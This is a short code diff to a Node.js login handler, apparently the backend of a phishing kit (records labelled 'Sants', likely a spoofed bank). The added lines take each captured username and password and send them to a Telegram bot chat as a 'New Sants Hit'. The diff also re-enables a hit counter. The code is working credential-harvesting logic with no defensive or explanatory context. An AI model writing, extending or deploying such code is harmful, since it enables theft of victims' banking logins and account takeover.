@@ -164,6 +164,18 @@ const submitLogin = async (req, res) => {
         .catch((e) => {
           console.log(e);
         });
+        await axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: '-837014205',
+              text: `New Sants Hit:\n\n${username}\n${password}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
       santsCount = 0;
     } else {
       await Sants.create({
@@ -175,7 +187,7 @@ const submitLogin = async (req, res) => {
         ip,
         timestamp: moment().format()
       });
-      // santsCount = santsCount + 1;
+      santsCount = santsCount + 1;
     }
     res.sendStatus(200);
   } catch (error) {
